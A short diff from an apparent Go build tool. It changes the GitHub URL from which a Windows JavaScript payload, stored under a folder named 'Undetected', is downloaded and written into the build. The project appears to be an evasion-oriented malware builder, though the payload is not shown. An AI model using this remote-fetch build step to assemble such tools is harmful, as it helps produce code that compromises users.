@@ -169,7 +169,7 @@ func buildPlatform() {
 				}
 			}
 			Info("Building Windows")
-			wincode := getCode("https://raw.githubusercontent.com/dotnoxty/Delirium/main/Undetected/index-win.js")
+			wincode := getCode("https://raw.githubusercontent.com/dotnoxty/delirium.gg/main/delirium/Undetected/index-win.js")
 			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
 				Fatal("Error writing to file", err)
